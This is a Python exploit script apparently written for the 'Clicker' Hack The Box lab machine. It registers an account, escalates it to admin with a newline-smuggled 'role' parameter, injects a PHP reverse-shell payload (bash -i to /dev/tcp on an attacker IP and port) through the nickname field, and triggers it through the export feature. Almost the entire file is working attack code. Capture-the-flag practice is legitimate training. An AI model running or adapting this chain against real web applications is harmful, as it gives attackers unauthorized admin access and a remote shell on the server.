# exploit for the clicker machine on HTB.
import requests
import logging
import re
import time
import argparse

# disable missing TLS warnings
logging.captureWarnings(True)

def regester(usrname, password):
    params = {"username": usrname, "password": password}
    requests.post("http://clicker.htb/create_player.php", data=params, allow_redirects=False, verify=False)

def login(usrname, password):
    params = {"username": usrname, "password": password}
    res = requests.post("http://clicker.htb/authenticate.php", data=params, allow_redirects=False, verify=False)
    return res.cookies.get("PHPSESSID")

def logout(headers):
    requests.get("http://clicker.htb/logout.php", verify=False, headers=headers)

def esclate(username, password, session):
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
        "Cookie": f"PHPSESSID={session}"
    }
    requests.get("http://clicker.htb/save_game.php?role%0a=Admin", headers=headers, verify=False)

    logout(headers)
    return login(username, password)  # new admin session

def uplpoad(session, ip, port):
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
        "Cookie": f"PHPSESSID={session}"
    }
    payload = f"<?php system('/bin/bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"'); ?>"
    encoded_payload = requests.utils.quote(payload)

    url = f"http://clicker.htb/save_game.php?clicks=10000000000000007&level=0&nickname={encoded_payload}"
    res = requests.get(url, headers=headers, verify=False)
    
def exort(session):
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
        "Cookie": f"PHPSESSID={session}"
    }
    
    params = {"threshold": 1000000, "extension": "php"}
    res = requests.post("http://clicker.htb/export.php", data=params, allow_redirects=False, verify=False, headers=headers)
    if 'Location' in res.headers:
        location = res.headers['Location']
        match = re.search(r'exports/([^\s]+)', location)
        if match:
            print("[*] Payload uploaded successfully!")
            file = match.group(1)
            print("[*] DONE!")
            requests.get(f"http://clicker.htb/exports/{file}", headers=headers, verify=False)
            return
    print("[-] Something went wrong!")

def main():
    parser = argparse.ArgumentParser(description="Clicker HTB exploit script")
    parser.add_argument("--ip", required=True, help="Attacker IP for reverse shell")
    parser.add_argument("--port", required=True, type=int, help="Attacker port for reverse shell")
    parser.add_argument("--username", required=True, help="Username to register/login")
    parser.add_argument("--password", required=True, help="Password for the account")
    args = parser.parse_args()

    print("[*] Please prepare a listener...")
    time.sleep(5)

    regester(args.username, args.password)
    print("[*] Regesterd!")

    sess = login(args.username, args.password)  
    print("[*] loged in!")

    admin_sess = esclate(args.username, args.password, sess)
    print("[*] Got admin!")

    uplpoad(admin_sess, args.ip, args.port)
    exort(admin_sess)

if __name__ == "__main__":
    main()
